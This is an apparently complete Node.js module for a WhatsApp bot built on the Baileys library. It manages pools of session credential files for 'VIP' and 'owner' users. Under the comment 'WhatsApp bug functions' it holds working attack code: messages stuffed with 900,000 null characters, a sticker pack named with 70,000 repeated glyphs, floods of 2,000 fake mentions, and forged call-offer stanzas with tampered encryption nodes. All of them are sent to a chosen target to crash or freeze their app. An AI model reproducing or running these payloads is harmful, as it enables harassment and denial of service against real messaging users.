const fs = require('fs');
const path = require('path');
const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateWAMessageFromContent, prepareWAMessageMedia, proto, jidEncode, JidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
const pino = require('pino');
const { logger } = require('../utils/logger');
const { loadKeyList, saveKeyList } = require('./databaseService');
const { safeStringify } = require('../utils/serialize_helper');
const crypto = require('crypto');

const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// Fungsi untuk mengecek apakah user memiliki role VIP atau Owner
function isVipOrOwner(user) {
  return user && ["vip", "owner"].includes(user.role);
}

// Fungsi untuk mendapatkan path session VIP
function getVipSessionPath(sessionName) {
  return path.join('./vip', sessionName);
}

// Fungsi untuk menyiapkan folder session VIP
function prepareVipSessionFolders() {
  const vipFolder = './vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
      logger.info("Folder session VIP dibuat.");
    }

    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      logger.info("Folder session VIP kosong.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Error menyiapkan folder session VIP:", err.message);
    return [];
  }
}

// Fungsi untuk menghubungkan ke session VIP
async function connectVipSession(sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionPath = getVipSessionPath(sessionName);
      const { state } = await useMultiFileAuthState(sessionPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          logger.info(`[VIP ${sessionName}] Terhubung`);

          const type = detectWATypeFromCreds(`${sessionPath}/creds.json`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.info(`[VIP ${sessionName}] Koneksi ditutup. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(sessionPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectVipSession(sessionName, retries - 1));
          } else {
            logger.info(`[VIP ${sessionName}] Logout atau maksimal percobaan tercapai.`);
            fs.rmSync(sessionPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.info(`[VIP ${sessionName}] DILEWATI (session tidak valid / belum login)`);
      resolve();
    }
  });
}

// Fungsi untuk memulai semua session VIP
async function startVipSessions() {
  const files = prepareVipSessionFolders();
  if (files.length === 0) return;

  logger.info(`[VIP] Ditemukan ${files.length} session`);

  for (const file of files) {
    const baseName = path.basename(file, '.json');

    // Lewati jika sudah terhubung
    if (activeConnections[baseName]) {
      logger.info(`[VIP ${baseName}] Sudah terhubung, dilewati.`);
      continue;
    }

    await connectVipSession(baseName);
  }
}

// Fungsi untuk mendapatkan koneksi VIP yang aktif
function getActiveVipConnections() {
  const vipConnections = {};
  
  for (const sessionName in activeConnections) {
    // Cek apakah session ini ada di folder VIP
    const sessionPath = getVipSessionPath(sessionName);
    if (fs.existsSync(sessionPath)) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  
  return vipConnections;
}

// Fungsi untuk mengecek apakah session adalah session VIP
function isVipSession(sessionName) {
  const sessionPath = getVipSessionPath(sessionName);
  return fs.existsSync(sessionPath);
}

// Fungsi untuk mendapatkan koneksi VIP acak
function getRandomVipConnection() {
  const vipConnections = getActiveVipConnections();
  const sessionNames = Object.keys(vipConnections);
  
  if (sessionNames.length === 0) return null;
  
  const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
  return vipConnections[randomSession];
}

// Modifikasi fungsi checkActiveSessionInFolder untuk menggunakan session VIP untuk user VIP/Owner
function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) {
  // Jika user adalah VIP atau Owner, cek session VIP terlebih dahulu
  if (isVipOrOwnerUser) {
    const vipConnections = getActiveVipConnections();
    const sessionNames = Object.keys(vipConnections);
    
    if (sessionNames.length > 0) {
      const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
      return vipConnections[randomSession];
    }
  }
  
  // Kembali ke session milik user
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logger.info("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      logger.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    process.exit(1);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          logger.info(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.info(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logger.info(`[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.info(`[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      resolve();
    }
  });
}

// Modifikasi fungsi startUserSessions untuk memulai session VIP juga
async function startUserSessions() {
  // Memulai session user biasa
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  logger.info(`[DEBUG] Ditemukan ${subfolders.length} subfolder di dalam permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      // Lewati jika session sudah aktif
      if (activeConnections[sessionName]) {
        logger.info(`[SKIP] Session ${sessionName} sudah aktif, dilewati...`);
        continue;
      }

      try {
        logger.info(`[START] Menghubungkan session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        logger.error(`[ERROR] Gagal memulai session ${sessionName}: ${err.message}`);
      }
    }
  }
  
  // Juga mulai session VIP
  await startVipSessions();
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logger.info(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logger.error(`[${sessionName}] Gagal disconnect: ${e.message}`);
    }
    delete activeConnections[sessionName];
  }

  logger.info('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

// WhatsApp bug functions
async function gsGlx(Yuukey, target, zid = true) {
  for(let z = 0; z < 10; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "7eppeli - Expos3d",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}


async function FreezePackk(tdx, target) {
  await tdx.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(70000),
      publisher: "[DarkVerse]" + "ꦾ".repeat(500),
      stickers: [],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135550202@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}

async function XMmL(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    sendPaymentMessage: {}
  }, {});
  sock.relayMessage(target, {
    ephemeralMessage: {
      message: msg.message
    }
  }, {
    participant: { jid: target }
  })
}


function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function fcinvisotax(sock, target) {
const sender = [...sessions.keys()][0];
  if (!sender || !sessions.has(sender)) return { success: false, error: "no-sender" };
  if (!sock) return { success: false, error: "invalid-session" };
  let baileysLib = null;
  try { baileysLib = require('@otaxayun/baileys'); } catch (e1) { try { baileysLib = require('@adiwajshing/baileys'); } catch (e2) { baileysLib = null; } }

  const encodeWAMessageFn = baileysLib?.encodeWAMessage ?? sock.encodeWAMessage?.bind(sock) ?? ((msg) => {
    try { return Buffer.from(JSON.stringify(msg)); } catch (e) { return Buffer.from([]); }
  });

  const encodeSignedDeviceIdentityFn = baileysLib?.encodeSignedDeviceIdentity ?? sock.encodeSignedDeviceIdentity?.bind(sock) ?? null;

  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const janda = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const javhd = janda();
    const jepang = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const yntkts = encodeWAMessageFn;

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      const patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      const ywdh = Array.isArray(patched) ? patched : recipientJids.map(j => ({ recipientJid: j, message: patched }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(ywdh.map(async ({ recipientJid: j, message: msg }) => {
        const { user: targetUser } = jidDecode(j);
        const { user: ownUser } = jidDecode(meId);
        const isOwn = targetUser === ownUser || targetUser === omak;
        const y = j === meId || j === meLid;
        if (dsmMessage && isOwn && !y) msg = dsmMessage;

        const bytes = jepang(yntkts ? yntkts(msg) : Buffer.from([]));
        return javhd.mutex(j, async () => {
          const { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid: j, data: bytes });
          if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
          return {
            tag: "to",
            attrs: { jid: j },
            content: [{ tag: "enc", attrs: { v: "2", type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let devices = [];
    try {
      devices = (await sock.getUSyncDevices([jid], false, false))
        .map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`);
    } catch {
      devices = [jid];
    }

    try { await sock.assertSessions(devices); } catch {}

    let { nodes: destinations, shouldIncludeDeviceIdentity } = { nodes: [], shouldIncludeDeviceIdentity: false };
    try {
      const created = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });
      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
    } catch { destinations = []; shouldIncludeDeviceIdentity = false; }

    const otaxkiw = {
      tag: "call",
      attrs: { to: jid, id: sock.generateMessageTag ? sock.generateMessageTag() : crypto.randomBytes(8).toString("hex"), from: sock.user?.id || sock.authState?.creds?.me?.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user?.id || sock.authState?.creds?.me?.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations }
        ]
      }]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentityFn) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentityFn(sock.authState.creds.account, true);
        otaxkiw.content[0].content.push({ tag: "device-identity", attrs: {}, content: deviceIdentity });
      } catch (e) {}
    }

    await sock.sendNode(otaxkiw);

    return { success: true, target: jid, method: "sendNode" };
  } catch (err) {
    return { success: false, error: err?.message ?? String(err) };
  }
}
    
async function permenCall(sock, toJid, isVideo = true) {
  const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);
  const encKey = crypto.randomBytes(32);
  const devices = (await sock.getUSyncDevices([toJid], true, false))
    .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

  await sock.assertSessions(devices, true);

  const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
    call: { callKey: new Uint8Array(encKey) }
  }, { count: '2' });


  const offerContent = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
    {
      tag: "video",
      attrs: {
        orientation: "0",
        screen_width: "1920",
        screen_height: "1080",
        device_orientation: "0",
        enc: "vp8",
        dec: "vp8"
      }
    },
    { tag: "net", attrs: { medium: "3" } },
    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
    { tag: "encopt", attrs: { keygen: "2" } },
    { tag: "destination", attrs: {}, content: destinations },
    ...(shouldIncludeDeviceIdentity ? [{
      tag: "device-identity",
      attrs: {},
      content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
    }] : [])
  ].filter(Boolean);


  const stanza = {
    tag: 'call',
    attrs: {
      id: sock.generateMessageTag(),
      from: sock.user.id,
      to: toJid
    },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': callId,
        'call-creator': sock.user.id
      },
      content: offerContent
    }]
  };

  await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
  return { id: callId, to: toJid };
}
async function invisMentions(sock, targetJid) {
  sock.relayMessage(targetJid, {
    albumMessage: {
      contextInfo: {
        mentions: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net` )
      }
    }
  },
  {
    participant: { jid: targetJid }
  }
  );
}
    
module.exports = {
  activeConnections,
  biz,
  mess,
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  gsGlx,
  invisMentions,
  FreezePackk,
  XMmL,
  sleep,
  permenCall,
  fcinvisotax,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder,
};